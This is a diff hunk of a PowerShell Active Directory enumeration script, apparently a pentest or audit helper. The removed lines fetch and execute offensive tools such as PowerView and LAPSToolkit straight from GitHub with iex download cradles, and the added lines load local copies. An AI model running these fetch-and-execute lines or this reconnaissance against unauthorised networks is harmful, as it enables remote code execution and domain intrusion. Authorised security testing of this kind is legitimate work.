@@ -33,12 +33,12 @@ $ErrorActionPreference = "SilentlyContinue"
 Import-Module .\Microsoft.ActiveDirectory.Management.dll
 # Active enum using toolz (Connection required)
 # Loading toolset
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1")
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-LdapSignCheck.ps1")
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NotMedic/NetNTLMtoSilverTicket/master/Get-SpoolStatus.ps1")
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/master/LAPSToolkit.ps1")
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/michiiii/Check-SMBSigning/master/Check-SMBSigning.ps1")
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/michiiii/SmbScanner/master/Check-SMBv1.ps1")
+. .\PowerView.ps1
+. .\Invoke-LdapSignCheck.ps1
+. .\Get-SpoolStatus.ps1
+. .\LAPSToolkit.ps1
+. .\Check-SMBSigning.ps1
+. .\Check-SMBv1.ps1
 
 
 #----------------------------------------------------------[Declarations]----------------------------------------------------------
